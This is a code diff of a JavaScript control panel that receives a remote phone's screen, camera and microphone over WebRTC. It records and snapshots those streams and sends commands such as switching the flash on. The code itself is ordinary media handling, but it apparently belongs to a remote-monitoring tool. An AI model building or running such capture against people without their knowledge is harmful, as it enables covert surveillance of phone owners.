@@ -1,316 +1,63 @@
-// ==================== WEBRTC MODULE ====================
-function createPeerConnection(streamType, onTrackCallback, useMic = false) {
-    const pc = new RTCPeerConnection({ iceServers: CONFIG.ICE_SERVERS });
-
-    if (streamType === 'screen') {
-        pc.addTransceiver('video', { direction: 'recvonly' });
-    } else if (streamType === 'camera') {
-        pc.addTransceiver('video', { direction: 'recvonly' });
-        if (useMic) {
-            pc.addTransceiver('audio', { direction: 'recvonly' });
-        }
-    } else if (streamType === 'audio') {
-        pc.addTransceiver('audio', { direction: 'recvonly' });
-    }
-
-    pc.ontrack = onTrackCallback;
-    pc.onicecandidate = (e) => {
-        if (e.candidate) {
-            sendSignalingMessage({
-                type: 'ICE_CANDIDATE',
-                candidate: e.candidate,
-                streamType: streamType
-            });
-        }
-    };
-    pc.oniceconnectionstatechange = () => {
-        console.log(`${streamType} ICE state:`, pc.iceConnectionState);
-        if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
-            if (streamType === 'screen') {
-                screenActive = false;
-                document.getElementById('screenBtn').innerText = 'Start Screen';
-                closeScreenModal();
-            }
-        }
-    };
-    pc.onconnectionstatechange = () => {
-        console.log(`${streamType} connection state:`, pc.connectionState);
-    };
+// ==================== WEBRTC ====================
+function createPeerConnection(type, onTrack, useMic, iceServers = window.CONFIG.ICE_SERVERS) {
+    const pc = new RTCPeerConnection({ iceServers: iceServers });
+    if (type === 'screen') pc.addTransceiver('video', { direction: 'recvonly' });
+    else if (type === 'camera') { pc.addTransceiver('video', { direction: 'recvonly' }); if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' }); }
+    else if (type === 'audio') pc.addTransceiver('audio', { direction: 'recvonly' });
+    pc.ontrack = onTrack;
+    pc.onicecandidate = e => { if (e.candidate) sendSignaling({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType: type }); };
+    pc.oniceconnectionstatechange = () => console.log(`${type} ICE state:`, pc.iceConnectionState);
     return pc;
 }
 
-function getPCForType(type) {
-    if (type === 'screen') return screenPC;
-    if (type === 'camera') return cameraPC;
-    if (type === 'audio') return audioPC;
-    return null;
-}
-
-function handleSignalingMessage(msg) {
-    console.log('Received signaling:', msg);
-    if (msg.type === 'ANSWER') {
-        const pc = getPCForType(msg.streamType);
-        if (pc) {
-            const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
-            pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
-        }
-    } else if (msg.type === 'ICE_CANDIDATE') {
-        const pc = getPCForType(msg.streamType);
-        if (pc && msg.candidate) {
-            pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
-        }
-    }
-}
-
-function openScreenModal() {
-    modalOverlay.classList.add('show');
-    document.body.classList.add('modal-open');
-    modalRecordBtn.innerText = '🔴';
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
-    }
-    screenMediaRecorder = null;
-    screenRecordedChunks = [];
-}
-
-function closeScreenModal() {
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
-    }
-    modalOverlay.classList.remove('show');
-    document.body.classList.remove('modal-open');
-    if (screenActive) {
-        toggleScreen();
-    }
-    modalRecordBtn.innerText = '🔴';
-}
-
 async function toggleScreen() {
-    console.log('toggleScreen called, current screenActive:', screenActive);
-    if (screenActive) {
-        if (screenPC) {
-            screenPC.close();
-            screenPC = null;
-        }
+    if (window.screenActive) {
+        if (window.screenPC) window.screenPC.close();
+        window.screenPC = null;
+        window.screenActive = false;
         document.getElementById('screenBtn').innerText = 'Start Screen';
-        screenActive = false;
-        closeScreenModal();
-        sendSignalingMessage({ type: 'STOP_SCREEN' });
+        document.getElementById('screenModalOverlay').classList.remove('show');
+        sendSignaling({ type: 'STOP_SCREEN' });
+        if (window.screenMediaRecorder && window.screenMediaRecorder.state === 'recording') window.screenMediaRecorder.stop();
+        window.screenMediaRecorder = null;
+        window.screenRecordedChunks = [];
+        const modalVideo = document.getElementById('modalScreenVideo');
+        if (modalVideo) modalVideo.srcObject = null;
     } else {
-        openScreenModal();
-        modalVideo.srcObject = null;
-
-        screenPC = createPeerConnection('screen', (e) => {
-            modalVideo.srcObject = e.streams[0];
-            console.log('ontrack for screen', e.streams);
+        document.getElementById('screenModalOverlay').classList.add('show');
+        document.body.classList.add('modal-open');
+        const modalVideo = document.getElementById('modalScreenVideo');
+        if (modalVideo) modalVideo.srcObject = null;
+        window.screenPC = createPeerConnection('screen', e => {
+            const modalVideo = document.getElementById('modalScreenVideo');
+            if (modalVideo && e.streams[0]) {
+                modalVideo.srcObject = e.streams[0];
+                console.log('Screen stream received');
+            }
         }, false);
-
         try {
-            const offer = await screenPC.createOffer();
-            await screenPC.setLocalDescription(offer);
-            sendSignalingMessage({
-                type: 'OFFER',
-                sdp: offer.sdp,
-                streamType: 'screen'
-            });
+            const offer = await window.screenPC.createOffer();
+            await window.screenPC.setLocalDescription(offer);
+            sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
             document.getElementById('screenBtn').innerText = 'Stop Screen';
-            screenActive = true;
+            window.screenActive = true;
+            window.screenMediaRecorder = null;
+            window.screenRecordedChunks = [];
+            document.getElementById('modalRecordBtn').innerText = '🔴';
         } catch (e) {
             console.error('Screen share failed:', e);
             showNotification('Failed: ' + e.message);
-            screenPC = null;
-            closeScreenModal();
+            window.screenPC = null;
+            document.getElementById('screenModalOverlay').classList.remove('show');
+            document.body.classList.remove('modal-open');
         }
     }
 }
 
 function snapScreenFromModal() {
-    if (!modalVideo || !modalVideo.videoWidth) {
-        alert('No active screen share or video not ready');
-        return;
-    }
-    const canvas = document.createElement('canvas');
-    canvas.width = modalVideo.videoWidth;
-    canvas.height = modalVideo.videoHeight;
-    canvas.getContext('2d').drawImage(modalVideo, 0, 0);
-    canvas.toBlob(blob => {
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.download = `screenImage-${getFormattedDateTime()}.png`;
-        a.href = url;
-        a.click();
-        URL.revokeObjectURL(url);
-    }, 'image/png');
-}
-
-function toggleScreenRecording() {
-    if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
-        screenMediaRecorder.stop();
-        modalRecordBtn.innerText = '🔴';
-    } else {
-        if (!modalVideo.srcObject) {
-            alert('Phone Screen Off');
-            return;
-        }
-        screenRecordedChunks = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const stream = modalVideo.srcObject;
-
-        if (modalVideo.videoWidth === 0) {
-            modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
-        } else {
-            startScreenRecording(canvas, ctx, stream);
-        }
-    }
-}
-
-function startScreenRecording(canvas, ctx, originalStream) {
-    canvas.width = modalVideo.videoWidth;
-    canvas.height = modalVideo.videoHeight;
-
-    function drawVideoFrame() {
-        ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
-        requestAnimationFrame(drawVideoFrame);
-    }
-    drawVideoFrame();
-
-    const canvasStream = canvas.captureStream(30);
-    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
-
-    screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-    screenMediaRecorder.ondataavailable = (e) => screenRecordedChunks.push(e.data);
-    screenMediaRecorder.onstop = () => {
-        const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `screenVideo-${getFormattedDateTime()}.webm`;
-        a.click();
-        URL.revokeObjectURL(url);
-        canvasStream.getTracks().forEach(track => track.stop());
-    };
-    screenMediaRecorder.start();
-    modalRecordBtn.innerText = '🟢';
-}
-
-function toggleFullscreen() {
-    if (!document.fullscreenElement) {
-        modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
-    } else {
-        document.exitFullscreen();
-    }
-}
-
-// Attach modal button listeners
-document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
-document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
-document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
-document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);
-
-async function startLiveStream() {
-    const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
-    const useFlash = document.getElementById('liveFlashCheckbox').checked;
-    const useMic = document.getElementById('liveMicCheckbox').checked;
-
-    panel.innerHTML = `
-        <div style="position:relative;">
-            <video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video>
-            <div class="live-controls" style="margin-top:10px;">
-                <button onclick="takeSnapshot()" id="snapshotBtn" style="background:#1976ff;">📸 Snapshot</button>
-                <button onclick="toggleRecording()" id="recordBtn" style="background:#ff9800;">🔴 Record</button>
-                <button class="stop" onclick="stopLiveStream()" style="background:#d32f2f;">⏹ Stop</button>
-            </div>
-        </div>
-    `;
-
-    cameraPC = createPeerConnection('camera', (e) => {
-        const video = document.getElementById('liveCamVideo');
-        if (video) video.srcObject = e.streams[0];
-        console.log('ontrack for camera', e.streams);
-    }, useMic);
-
-    try {
-        const offer = await cameraPC.createOffer();
-        await cameraPC.setLocalDescription(offer);
-        sendSignalingMessage({
-            type: 'OFFER',
-            sdp: offer.sdp,
-            streamType: 'camera',
-            camera: camera,
-            flash: useFlash,
-            mic: useMic
-        });
-    } catch (e) {
-        console.error('Live camera start failed:', e);
-        showNotification('Failed to start camera stream');
-        cameraPC = null;
-        panel.innerHTML = 'Ready.';
-    }
-}
-
-function stopLiveStream() {
-    if (cameraPC) {
-        cameraPC.close();
-        cameraPC = null;
-    }
-    sendSignalingMessage({ type: 'STOP_CAMERA' });
-    panel.innerHTML = 'Ready.';
-}
-
-async function toggleLiveAudio() {
-    if (audioPC) {
-        stopLiveAudio();
-    } else {
-        startLiveAudio();
-    }
-}
-
-async function startLiveAudio() {
-    panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
-    audioPC = createPeerConnection('audio', (e) => {
-        const audioEl = document.getElementById('liveAudio');
-        if (audioEl) {
-            audioEl.srcObject = e.streams[0];
-            audioEl.play().catch(err => console.log('Autoplay prevented:', err));
-        }
-        console.log('ontrack for audio', e.streams);
-    }, true);
-
-    try {
-        const offer = await audioPC.createOffer();
-        await audioPC.setLocalDescription(offer);
-        sendSignalingMessage({
-            type: 'OFFER',
-            sdp: offer.sdp,
-            streamType: 'audio',
-            mic: true
-        });
-        document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
-        document.getElementById('stopLiveAudioBtn').style.display = 'block';
-    } catch (e) {
-        console.error('Live audio start failed:', e);
-        showNotification('Failed to start audio stream');
-        audioPC = null;
-        panel.innerHTML = 'Ready.';
-    }
-}
-
-function stopLiveAudio() {
-    if (audioPC) {
-        audioPC.close();
-        audioPC = null;
-    }
-    sendSignalingMessage({ type: 'STOP_AUDIO' });
-    document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
-    document.getElementById('stopLiveAudioBtn').style.display = 'none';
-    panel.innerHTML = 'Ready.';
-}
-
-function takeSnapshot() {
-    const video = document.getElementById('liveCamVideo');
+    const video = document.getElementById('modalScreenVideo');
     if (!video || !video.videoWidth) {
-        alert('No live video or video not ready');
+        alert('No active screen share or video not ready yet. Please wait a moment.');
         return;
     }
     const canvas = document.createElement('canvas');
@@ -320,66 +67,234 @@ function takeSnapshot() {
     canvas.toBlob(blob => {
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
+        a.download = `screen-${Date.now()}.png`;
         a.href = url;
-        a.download = `snapshot_${Date.now()}.png`;
         a.click();
         URL.revokeObjectURL(url);
+        showNotification('Screenshot saved');
     }, 'image/png');
 }
 
-function toggleRecording() {
-    const video = document.getElementById('liveCamVideo');
+function toggleScreenRecording() {
+    const video = document.getElementById('modalScreenVideo');
     if (!video || !video.srcObject) {
-        alert('No live stream');
+        alert('No active screen share. Start screen share first.');
         return;
     }
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-        document.getElementById('recordBtn').innerText = 'Record Video';
+    if (window.screenMediaRecorder && window.screenMediaRecorder.state === 'recording') {
+        window.screenMediaRecorder.stop();
+        document.getElementById('modalRecordBtn').innerText = '🔴';
+        showNotification('Recording stopped');
     } else {
-        recordedChunks = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const stream = video.srcObject;
-
         if (video.videoWidth === 0) {
-            video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
+            video.addEventListener('loadedmetadata', () => startScreenRecording(), { once: true });
         } else {
-            startCanvasRecording(video, canvas, ctx, stream);
+            startScreenRecording();
         }
     }
 }
 
-function startCanvasRecording(video, canvas, ctx, originalStream) {
-    canvas.width = video.videoHeight;
-    canvas.height = video.videoWidth;
-
-    function drawVideoFrame() {
-        ctx.save();
-        ctx.translate(canvas.width / 2, canvas.height / 2);
-        ctx.rotate(90 * Math.PI / 180);
-        ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
-                     video.videoWidth, video.videoHeight);
-        ctx.restore();
-        requestAnimationFrame(drawVideoFrame);
+function startScreenRecording() {
+    const video = document.getElementById('modalScreenVideo');
+    if (!video || !video.videoWidth) {
+        alert('Video not ready. Please wait.');
+        return;
     }
-    drawVideoFrame();
-
+    window.screenRecordedChunks = [];
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    const drawFrame = () => {
+        if (video.videoWidth && video.videoHeight) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        }
+        requestAnimationFrame(drawFrame);
+    };
+    drawFrame();
     const canvasStream = canvas.captureStream(30);
-    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
-
-    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-    mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    const originalStream = video.srcObject;
+    if (originalStream && originalStream.getAudioTracks().length) {
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+    }
+    window.screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+    window.screenMediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) window.screenRecordedChunks.push(e.data);
+    };
+    window.screenMediaRecorder.onstop = () => {
+        const blob = new Blob(window.screenRecordedChunks, { type: 'video/webm' });
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
-        a.download = `recording_${Date.now()}.webm`;
+        a.download = `screen-recording-${Date.now()}.webm`;
         a.click();
         URL.revokeObjectURL(url);
-        canvasStream.getTracks().forEach(track => track.stop());
+        window.screenRecordedChunks = [];
+        showNotification('Recording saved');
     };
-    mediaRecorder.start();
-    document.getElementById('recordBtn').innerText = 'Stop Recording';
+    window.screenMediaRecorder.start(1000);
+    document.getElementById('modalRecordBtn').innerText = '🟢';
+    showNotification('Recording started');
+}
+
+function toggleFullscreen() {
+    const video = document.getElementById('modalScreenVideo');
+    if (!video) return;
+    if (!document.fullscreenElement) {
+        video.requestFullscreen().catch(err => console.warn('Fullscreen error:', err));
+    } else {
+        document.exitFullscreen();
+    }
+}
+
+function closeScreenModal() {
+    if (window.screenMediaRecorder && window.screenMediaRecorder.state === 'recording') {
+        window.screenMediaRecorder.stop();
+    }
+    document.getElementById('screenModalOverlay').classList.remove('show');
+    document.body.classList.remove('modal-open');
+    if (window.screenActive) {
+        if (window.screenPC) window.screenPC.close();
+        window.screenPC = null;
+        window.screenActive = false;
+        document.getElementById('screenBtn').innerText = 'Start Screen';
+        sendSignaling({ type: 'STOP_SCREEN' });
+    }
+    const modalVideo = document.getElementById('modalScreenVideo');
+    if (modalVideo) modalVideo.srcObject = null;
+    document.getElementById('modalRecordBtn').innerText = '🔴';
+}
+
+document.getElementById('modalSnapBtn').addEventListener('click', snapScreenFromModal);
+document.getElementById('modalRecordBtn').addEventListener('click', toggleScreenRecording);
+document.getElementById('modalFullscreenBtn').addEventListener('click', toggleFullscreen);
+document.getElementById('modalCloseBtn').addEventListener('click', closeScreenModal);
+
+function showCameraModal(stream, cameraType) {
+    const modal = document.getElementById('cameraModalOverlay');
+    const video = document.getElementById('modalCameraVideo');
+    video.srcObject = stream;
+    window.currentCameraStream = stream;
+    modal.classList.add('show');
+    document.body.classList.add('modal-open');
+    let recording = false, recorder = null, chunks = [];
+    document.getElementById('cameraSnapBtn').onclick = () => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(b => { const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = `snapshot_${Date.now()}.png`; a.click(); URL.revokeObjectURL(b); });
+    };
+    document.getElementById('cameraRecordBtn').onclick = () => {
+        if (recording && recorder) { recorder.stop(); document.getElementById('cameraRecordBtn').innerText = '🔴'; recording = false; }
+        else {
+            chunks = [];
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            const draw = () => { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); requestAnimationFrame(draw); };
+            draw();
+            const canvasStream = canvas.captureStream(30);
+            if (stream.getAudioTracks().length) stream.getAudioTracks().forEach(t => canvasStream.addTrack(t));
+            recorder = new MediaRecorder(canvasStream);
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = `recording_${Date.now()}.webm`;
+                a.click();
+                URL.revokeObjectURL(blob);
+                canvasStream.getTracks().forEach(t => t.stop());
+            };
+            recorder.start();
+            recording = true;
+            document.getElementById('cameraRecordBtn').innerText = '🟢';
+        }
+    };
+    document.getElementById('cameraFullscreenBtn').onclick = () => { if (video.requestFullscreen) video.requestFullscreen(); };
+    document.getElementById('cameraCloseBtn').onclick = () => {
+        if (recorder && recorder.state === 'recording') recorder.stop();
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        modal.classList.remove('show');
+        document.body.classList.remove('modal-open');
+        if (window.cameraPC) window.cameraPC.close();
+        window.cameraPC = null;
+        sendSignaling({ type: 'STOP_CAMERA' });
+        sendCommand('FLASH_OFF');
+    };
+}
+
+async function startLiveCamera() {
+    const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
+    const useFlash = document.getElementById('liveFlashCheckbox').checked;
+    const useMic = document.getElementById('liveMicCheckbox').checked;
+    if (useFlash && camera === 'back') sendCommand('FLASH_ON');
+    window.cameraPC = createPeerConnection('camera', e => showCameraModal(e.streams[0], camera), useMic);
+    const offer = await window.cameraPC.createOffer();
+    await window.cameraPC.setLocalDescription(offer);
+    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera, flash: useFlash, mic: useMic });
+}
+
+function stopLiveStream() {
+    if (window.cameraPC) window.cameraPC.close();
+    window.cameraPC = null;
+    sendSignaling({ type: 'STOP_CAMERA' });
+    sendCommand('FLASH_OFF');
+    window.panel.innerHTML = 'Ready.';
+}
+
+function showAudioModal(stream) {
+    const modal = document.getElementById('audioModalOverlay');
+    const audio = document.getElementById('modalAudioPlayer');
+    audio.srcObject = stream;
+    window.currentAudioStream = stream;
+    modal.classList.add('show');
+    document.body.classList.add('modal-open');
+    let recording = false, recorder = null, chunks = [];
+    document.getElementById('audioRecordBtn').onclick = () => {
+        if (recording && recorder) { recorder.stop(); document.getElementById('audioRecordBtn').innerText = '🔴'; recording = false; }
+        else {
+            chunks = [];
+            recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = `audio_${Date.now()}.webm`;
+                a.click();
+                URL.revokeObjectURL(blob);
+            };
+            recorder.start();
+            recording = true;
+            document.getElementById('audioRecordBtn').innerText = '🟢';
+        }
+    };
+    document.getElementById('audioCloseBtn').onclick = () => {
+        if (recorder && recorder.state === 'recording') recorder.stop();
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        modal.classList.remove('show');
+        document.body.classList.remove('modal-open');
+        stopLiveAudio();
+    };
+}
+
+async function startLiveAudio() {
+    window.audioPC = createPeerConnection('audio', e => showAudioModal(e.streams[0]), true);
+    const offer = await window.audioPC.createOffer();
+    await window.audioPC.setLocalDescription(offer);
+    sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true });
+    document.getElementById('liveAudioBtn').style.display = 'none';
+    document.getElementById('stopLiveAudioBtn').style.display = 'block';
+}
+
+function stopLiveAudio() {
+    if (window.audioPC) window.audioPC.close();
+    window.audioPC = null;
+    sendSignaling({ type: 'STOP_AUDIO' });
+    document.getElementById('liveAudioBtn').style.display = 'block';
+    document.getElementById('stopLiveAudioBtn').style.display = 'none';
+    window.panel.innerHTML = 'Ready.';
 }
